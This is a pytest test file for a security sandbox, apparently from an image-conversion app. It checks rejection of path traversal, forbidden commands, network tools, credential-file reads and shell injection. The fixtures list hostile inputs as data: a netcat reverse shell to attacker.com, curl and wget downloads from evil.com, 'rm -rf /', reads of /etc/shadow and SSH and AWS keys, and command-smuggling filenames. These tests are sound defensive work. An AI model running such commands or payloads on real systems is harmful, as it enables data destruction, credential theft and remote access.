"""Unit tests for the Security Sandbox module."""

import os
import resource
import subprocess
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, Mock, call, patch

import pytest

from app.core.security.sandbox import SandboxConfig, SecurityError, SecuritySandbox


class TestSecuritySandbox:
    """Test suite for SecuritySandbox class."""

    @pytest.fixture
    def security_sandbox(self):
        """Create a SecuritySandbox instance for testing."""
        config = SandboxConfig(
            max_memory_mb=512,
            max_cpu_percent=80,
            timeout_seconds=30,
            max_output_size_mb=50,
        )
        return SecuritySandbox(config)

    @pytest.fixture
    def temp_dir(self):
        """Create a temporary directory for testing."""
        import tempfile

        temp_path = Path(tempfile.mkdtemp())
        yield temp_path
        # Cleanup
        import shutil

        shutil.rmtree(temp_path, ignore_errors=True)

    @pytest.fixture
    def malicious_payloads(self):
        """Get malicious test payloads."""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "image.jpg\x00.exe",
        ]

    def test_sandbox_initialization(self, security_sandbox):
        """Test sandbox initializes with proper defaults."""
        assert security_sandbox.config.max_memory_mb == 512
        assert security_sandbox.config.max_cpu_percent == 80
        assert security_sandbox.config.timeout_seconds == 30
        assert security_sandbox.config.max_output_size_mb == 50
        assert isinstance(security_sandbox.config.blocked_commands, set)
        assert isinstance(security_sandbox.config.blocked_env_vars, set)

    def test_sandbox_blocks_path_traversal(self, security_sandbox, malicious_payloads):
        """Test sandbox blocks path traversal attempts."""
        for filename in malicious_payloads:
            # Act & Assert
            with pytest.raises(SecurityError, match="Path traversal|Null byte"):
                security_sandbox.validate_path(filename)

    def test_sandbox_allows_safe_paths(self, security_sandbox, temp_dir):
        """Test sandbox allows legitimate paths."""
        # Arrange
        safe_paths = [
            "image.jpg",
            "output/converted.webp",
            "temp_file.png",
        ]

        # Act & Assert
        for path in safe_paths:
            # Should not raise
            security_sandbox.validate_path(path)

    @patch("subprocess.Popen")
    def test_sandbox_enforces_resource_limits(self, mock_popen, security_sandbox):
        """Test sandbox enforces resource limits on subprocess."""
        # Arrange
        mock_process = Mock()
        mock_popen.return_value = mock_process
        mock_process.communicate.return_value = (b"output", b"")
        mock_process.returncode = 0
        mock_process.poll.return_value = 0

        # Act
        result = security_sandbox.execute_sandboxed(command=["echo", "test"])

        # Assert
        mock_popen.assert_called_once()
        call_args = mock_popen.call_args

        # Verify resource limits are set
        assert call_args.kwargs.get("preexec_fn") is not None
        assert result["returncode"] == 0
        assert result["output"] == b"output"

    def test_sandbox_blocks_dangerous_commands(self, security_sandbox):
        """Test sandbox blocks dangerous shell commands."""
        # Arrange
        dangerous_commands = [
            ["rm", "-rf", "/"],
            ["curl", "evil.com/malware.sh"],
            ["nc", "-e", "/bin/sh", "attacker.com", "4444"],
            ["wget", "http://evil.com/backdoor"],
            ["sh", "-c", "cat /etc/passwd"],
        ]

        # Act & Assert
        for cmd in dangerous_commands:
            with pytest.raises(SecurityError, match="Forbidden command"):
                security_sandbox.validate_command(cmd)

    @patch("os.killpg")
    @patch("os.getpgid")
    @patch("subprocess.Popen")
    def test_sandbox_timeout_enforcement(
        self, mock_popen, mock_getpgid, mock_killpg, security_sandbox
    ):
        """Test sandbox enforces execution timeout."""
        # Arrange
        mock_process = Mock()
        mock_popen.return_value = mock_process
        mock_process.pid = 12345
        mock_getpgid.return_value = 12345
        # Simulate timeout
        mock_process.communicate.side_effect = subprocess.TimeoutExpired(
            cmd=["echo", "test"], timeout=5
        )
        mock_process.poll.return_value = None

        # Act & Assert
        with pytest.raises(TimeoutError, match="Execution timeout"):
            security_sandbox.execute_sandboxed(command=["echo", "test"], timeout=5)

        # Verify process was killed (may be called multiple times due to cleanup)
        assert mock_process.kill.call_count >= 1
        mock_killpg.assert_called_once_with(12345, 9)

    @patch("subprocess.Popen")
    def test_sandbox_memory_limit_enforcement(self, mock_popen, security_sandbox):
        """Test sandbox enforces memory limits."""
        # Arrange
        mock_process = Mock()
        mock_popen.return_value = mock_process
        mock_process.communicate.return_value = (b"", b"Memory limit exceeded")
        mock_process.returncode = -9  # SIGKILL
        mock_process.poll.return_value = -9

        # Act & Assert
        with pytest.raises(MemoryError, match="Memory limit exceeded"):
            security_sandbox.execute_sandboxed(
                command=["echo", "test"], max_memory_mb=100
            )

    def test_sandbox_network_isolation(self, security_sandbox):
        """Test sandbox blocks network access."""
        # Arrange
        network_commands = [
            ["curl", "http://example.com"],
            ["wget", "https://example.com"],
            ["nc", "example.com", "80"],
            ["telnet", "example.com", "80"],
        ]

        # Act & Assert
        for cmd in network_commands:
            with pytest.raises(SecurityError, match="Forbidden command"):
                security_sandbox.validate_command(cmd)

    def test_sandbox_filesystem_restrictions(self, security_sandbox, temp_dir):
        """Test sandbox filesystem access restrictions."""
        # Arrange
        restricted_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/root/.ssh/id_rsa",
            "~/.aws/credentials",
            "/proc/self/environ",
        ]

        # Act & Assert
        for path in restricted_paths:
            with pytest.raises(
                SecurityError, match="Path traversal detected|Access denied"
            ):
                security_sandbox.validate_file_access(path, mode="read")

    def test_sandbox_prevents_code_injection(self, security_sandbox):
        """Test sandbox prevents code injection attempts."""
        # Arrange
        injection_attempts = [
            "image.jpg; cat /etc/passwd",
            "image.jpg && rm -rf /",
            "image.jpg | nc attacker.com 4444",
            "$(cat /etc/passwd)",
            "`whoami`",
            "image.jpg\n/bin/sh",
        ]

        # Act & Assert
        for payload in injection_attempts:
            with pytest.raises(SecurityError, match="Invalid filename"):
                security_sandbox.sanitize_filename(payload)

    def test_sandbox_environment_isolation(self, security_sandbox):
        """Test sandbox isolates environment variables."""
        # Arrange
        with patch("subprocess.Popen") as mock_popen:
            mock_process = Mock()
            mock_popen.return_value = mock_process
            mock_process.communicate.return_value = (b"output", b"")
            mock_process.returncode = 0

            # Act
            security_sandbox.execute_sandboxed(
                command=["convert", "input.jpg", "output.jpg"]
            )

            # Assert
            call_args = mock_popen.call_args
            env = call_args.kwargs.get("env", {})

            # Verify sensitive env vars are removed
            assert "AWS_SECRET_ACCESS_KEY" not in env
            assert "DATABASE_URL" not in env
            assert "API_KEY" not in env
            assert "PATH" in env  # But PATH should be minimal

    def test_sandbox_handles_zombie_processes(self, security_sandbox):
        """Test sandbox properly cleans up zombie processes."""
        # Arrange
        with patch("subprocess.Popen") as mock_popen:
            mock_process = Mock()
            mock_popen.return_value = mock_process
            mock_process.poll.return_value = None  # Still running

            # Simulate process becoming zombie
            mock_process.communicate.side_effect = Exception("Process died")

            # Act & Assert
            with pytest.raises(Exception):
                security_sandbox.execute_sandboxed(
                    command=["convert", "input.jpg", "output.jpg"]
                )

            # Verify cleanup attempted
            mock_process.kill.assert_called()

    @patch("os.setuid")
    @patch("os.setgid")
    def test_sandbox_drops_privileges(self, mock_setgid, mock_setuid, security_sandbox):
        """Test sandbox drops privileges when configured."""
        # Arrange
        security_sandbox.sandbox_uid = 1000
        security_sandbox.sandbox_gid = 1000

        with patch("subprocess.Popen") as mock_popen:
            mock_process = Mock()
            mock_popen.return_value = mock_process
            mock_process.communicate.return_value = (b"output", b"")
            mock_process.returncode = 0

            # Act
            security_sandbox.execute_sandboxed(
                command=["convert", "input.jpg", "output.jpg"]
            )

            # Assert
            # Verify preexec_fn is set (which would drop privileges)
            call_args = mock_popen.call_args
            assert call_args.kwargs.get("preexec_fn") is not None

    def test_sandbox_validates_output_size(self, security_sandbox):
        """Test sandbox validates output doesn't exceed limits."""
        # Arrange
        with patch("subprocess.Popen") as mock_popen:
            mock_process = Mock()
            mock_popen.return_value = mock_process
            # Simulate very large output
            mock_process.communicate.return_value = (b"X" * (100 * 1024 * 1024), b"")
            mock_process.returncode = 0

            # Act & Assert
            with pytest.raises(ValueError, match="Output too large"):
                security_sandbox.execute_sandboxed(
                    command=["convert", "input.jpg", "output.jpg"],
                    max_output_size_mb=50,
                )
